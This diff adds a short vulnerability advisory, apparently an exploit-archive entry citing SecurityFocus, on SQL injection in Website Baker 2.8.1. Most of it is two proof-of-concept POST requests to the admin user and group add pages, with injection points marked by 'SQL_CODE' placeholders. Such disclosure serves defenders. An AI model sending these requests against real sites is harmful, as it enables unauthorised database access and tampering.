@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/47332/info
+
+Website Baker is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+Website Baker 2.8.1 is vulnerable; other versions may also be affected. 
+
+POST /admin/users/add.php HTTP/1.1
+
+user_id=&username_fieldname=username_1hnuvyv2&username_1hnuvyv2=test&password=password&password2=password&display_name=test&email=test%40test.com&home_folder=123'SQL_CODE&groups%5B%5D=123'SQL_CODE&active%5B%5D=1&submit=Add
+
+
+POST /admin/groups/add.php HTTP/1.1
+
+advanced=no&group_id=&group_name=123%27SQL_CODE_HERE&module_permissions%5B%5D=code&module_permissions%5B%5D=form&module_permissions%5B%5D=menu_link&module_permissions%5B%5D=news&module_permissions%5B%5D=wrapper&module_permissions%5B%5D=wysiwyg&template_permissions%5B%5D=allcss&template_permissions%5B%5D=argos_theme&template_permissions%5B%5D=blank&template_permissions%5B%5D=classic_theme&template_permissions%5B%5D=round&template_permissions%5B%5D=simple&template_permissions%5B%5D=wb_theme&submit=Add
